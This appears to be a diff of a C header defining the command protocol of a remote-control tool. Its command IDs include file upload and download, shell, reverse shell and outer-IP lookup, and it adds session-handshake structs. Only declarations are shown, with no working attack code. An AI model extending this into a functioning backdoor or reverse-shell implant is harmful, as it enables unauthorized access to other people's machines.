@@ -22,11 +22,15 @@ struct CmdRsp
 };
 #pragma pack(pop)
 
-#define CLIENT_CMD_HELLO 0xff
 struct Hello
 {
     char msg[4]; //固定为HALO
-    unsigned short key;
+    unsigned int timestamp;
+};
+
+struct NewSession
+{
+    char magic[4];//固定为0xdeadcafe
     unsigned int timestamp;
 };
 
@@ -42,7 +46,7 @@ enum ServerCmdId
     SERVER_CMD_NOTHING = 0,
     SERVER_CMD_GETUID ,
     SERVER_CMD_UPLOAD ,
-    SERVER_CMD_DOWNLOAD ,
+    SERVER_CMD_DOWNLOAD,
     SERVER_CMD_SHELL ,
     SERVER_CMD_MOVE ,
     SERVER_CMD_MKDIR ,
@@ -54,7 +58,9 @@ enum ServerCmdId
     SERVER_CMD_GETCWD,
     SERVER_CMD_GETOUTERIP,
     SERVER_CMD_REVERSESHELL,
-    SERVER_CMD_END = 255
+    SERVER_CMD_NEWSESSION = 0xfd,
+    SERVER_CMD_HELLo = 0xfe,
+    SERVER_CMD_END = 0xff
 };
 
 int handleCmd(const struct CmdReq * cmd, char * out, int maxSize);
